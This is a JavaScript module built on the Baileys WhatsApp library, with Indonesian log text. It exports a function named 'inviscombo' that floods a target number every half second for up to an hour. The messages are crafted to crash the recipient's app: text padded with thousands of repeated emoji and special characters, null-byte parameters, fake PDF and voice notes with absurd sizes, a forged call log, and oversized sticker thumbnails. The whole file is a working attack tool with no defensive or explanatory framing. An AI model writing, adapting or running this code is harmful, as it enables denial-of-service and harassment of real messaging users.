const chalk = require("chalk");
const crypto = require("crypto");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

async function inviscombo(RyuuBotz, target, durationMinutes = 60) {
  if (typeof target !== "string") return console.error("❌ Target bukan string:", target);
  if (target === RyuuBotz.user.id) return console.log("⛔ Tidak boleh kirim ke bot sendiri.");

  const maxDuration = durationMinutes * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const loop = async () => {
    const elapsed = Date.now() - startTime;
    if (elapsed > maxDuration) return console.log("🛑 InvisiCombo selesai setelah", durationMinutes, "menit.");

    try {
      console.log(chalk.red(`⚡ InvisiCombo [${++count}] ke ${target}`));

      // 1. NativeFlow
      const nativeFlow = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "💥 SYSTEM ERROR " + "⚠️".repeat(3000), format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "💀 WA_CORE_CRASH_" + "🚫".repeat(2000),
                paramsJson: JSON.stringify({ explode: true }),
                version: 999
              },
              contextInfo: { isForwarded: true, forwardingScore: 9999 }
            }
          }
        }
      }, { userJid: target });
      const sent1 = await RyuuBotz.sendMessage(target, nativeFlow.message);
      

      // 2. Fake PTT (voice)
      const sent2 = await RyuuBotz.sendMessage(target, {
        audio: Buffer.alloc(1),
        mimetype: 'audio/ogg; codecs=opus',
        ptt: true,
        seconds: 999999
      });

      // 3. Fake PDF
      const sent3 = await RyuuBotz.sendMessage(target, {
        document: Buffer.alloc(1),
        fileName: "⚠️ CRASH_REPORT.pdf",
        mimetype: "application/pdf",
        fileLength: 999999999,
        pageCount: 99999
      });
     

      // 4. Fake CallLog quote
      const quoted = {
        key: {
          remoteJid: target,
          fromMe: false,
          id: "FAKECALL1"
        },
        message: {
          callLogMessage: {
            callType: "VIDEO",
            callResult: "REJECTED",
            durationSecs: 99999
          }
        }
      };
      const sent4 = await RyuuBotz.sendMessage(target, {
        text: "📞 SYSTEM_CALL_ERROR",
      }, { quoted });
      

      // 5. StickerPack crash
      const stickerPack = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            stickerPackMessage: {
              stickerPackId: "crash-uuid",
              name: "⚡ CRASH STICKER " + "⚠️".repeat(5000),
              publisher: "WA_CORE_TEAM",
              caption: "💀 RIP SYSTEM 💀",
              stickers: [],
              fileLength: "728050",
              fileSha256: crypto.randomBytes(32).toString("base64"),
              fileEncSha256: crypto.randomBytes(32).toString("base64"),
              mediaKey: crypto.randomBytes(32).toString("base64"),
              contextInfo: {
                isForwarded: true,
                forwardingScore: 9999
              },
              jpegThumbnail: null,
              thumbnailSha256: crypto.randomBytes(32).toString("base64"),
              thumbnailEncSha256: crypto.randomBytes(32).toString("base64"),
              thumbnailHeight: 999999999,
              thumbnailWidth: 999999999,
              mediaKeyTimestamp: Date.now().toString().slice(0, 10)
            }
          }
        }
      }, { userJid: target });
      const sent5 = await RyuuBotz.sendMessage(target, stickerPack.message);
      

      // 6. Raw Silent relay
      const rawSilent = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: 'https://mmg.whatsapp.net/v/t62.7119-24/crash.enc',
                  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                  fileSha256: crypto.randomBytes(32).toString("base64"),
                  fileLength: "999999999",
                  pageCount: 0x9184e729fff,
                  mediaKey: crypto.randomBytes(32).toString("base64"),
                  fileName: "⚠️ Hidden Crash",
                  fileEncSha256: crypto.randomBytes(32).toString("base64"),
                  directPath: '/v/t62.7119-24/crash.enc',
                  mediaKeyTimestamp: `${Math.floor(Date.now() / 1000)}`,
                  contactVcard: true
                },
                hasMediaAttachment: true
              },
              body: {
                text: "💣 SYSTEM MUTE" + "ꦾ".repeat(25000)
              },
              nativeFlowMessage: {
                name: "💀 SYSTEM_SILENT",
                paramsJson: "\u0000".repeat(99999),
                version: 99
              },
              contextInfo: {
                mentionedJid: Array.from({ length: 3 }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "🌑 Stealth Crash"
                }]
              }
            }
          }
        }
      };
      await RyuuBotz.relayMessage(target, rawSilent, {
        participant: { jid: target }
      });

    } catch (err) {
      console.error("❌ Error:", err.message);
    }

    setTimeout(loop, 500); // delay
  };

  loop();
}

module.exports = inviscombo;